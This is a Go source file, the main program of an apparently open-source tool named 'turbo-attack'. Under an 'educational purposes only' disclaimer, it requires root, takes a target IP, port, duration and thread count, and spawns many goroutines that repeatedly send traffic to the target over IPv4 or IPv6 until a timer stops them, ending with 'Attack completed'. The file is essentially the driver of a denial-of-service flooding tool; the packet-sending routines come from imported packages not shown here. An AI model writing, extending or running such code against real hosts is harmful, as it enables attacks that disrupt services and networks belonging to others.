// Terms Of Use
// ------------
// Do NOT use this on any computer you do not own or are not allowed to run this on.
// You may NEVER attempt to sell this, it is free and open source.
// The authors and publishers assume no responsibility.
// For educational purposes only.

// go build
// PATH=/usr/local/go/bin:"$PATH" /usr/bin/dlv debug --headless --listen=:2345 --log --api-version=2 turbo-attack -- eth0 4 192.168.0.2 443 60 10

package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"sync"
	"time"

	"github.com/mytechnotalent/turbo-attack/convert"
	"github.com/mytechnotalent/turbo-attack/routine"
	"github.com/mytechnotalent/turbo-attack/sudo"
)

func main() {
	if runtime.GOOS != "linux" {
		fmt.Println("application will only run on linux")
		return
	}

	err := sudo.Check(0)
	if err != nil {
		log.Fatal("application will only run as root (sudo)")
	}

	if len(os.Args) != 7 {
		fmt.Println("usage: turbo-attack_010_linux_arm64 <ethInterface> <ipVersion> <ip> <port> <time> <goroutines>")
		return
	}

	ethInterface := os.Args[1]
	ipVersion := os.Args[2]
	ip := os.Args[3]
	port := os.Args[4]
	attackTime := os.Args[5]
	goroutines := os.Args[6]

	var wg sync.WaitGroup

	// Parse attack duration
	attackDuration, err := convert.ParseTime(&attackTime)
	if err != nil {
		log.Fatal(err)
	}

	// Parse goroutines count
	goroutineCount, err := convert.ParseGoroutines(&goroutines)
	if err != nil {
		log.Fatal(err)
	}

	// Create a channel to signal when to stop
	stopChan := make(chan struct{})

	// Start a timer to stop the attack after the specified duration
	go func() {
		time.Sleep(time.Duration(*attackDuration) * time.Second)
		close(stopChan)
	}()

	if ipVersion == "4" {
		ip4Byte, portByte, err := convert.IP4(&ethInterface, &ip, &port)
		if err != nil {
			log.Fatal(err)
		}

		// Launch goroutines
		for i := 0; i < *goroutineCount; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-stopChan:
						return
					default:
						err := routine.IP4(&ethInterface, ip4Byte, portByte)
						if err != nil {
							log.Println(err)
						}
					}
				}
			}()
		}
	} else if ipVersion == "6" {
		ip6Byte, portByte, err := convert.IP6(&ethInterface, &ip, &port)
		if err != nil {
			log.Fatal(err)
		}

		// Launch goroutines
		for i := 0; i < *goroutineCount; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				for {
					select {
					case <-stopChan:
						return
					default:
						err := routine.IP6(&ethInterface, ip6Byte, portByte)
						if err != nil {
							log.Println(err)
						}
					}
				}
			}()
		}
	} else {
		fmt.Println("valid: 4 or 6")
		return
	}

	wg.Wait()
	fmt.Println("Attack completed")
}
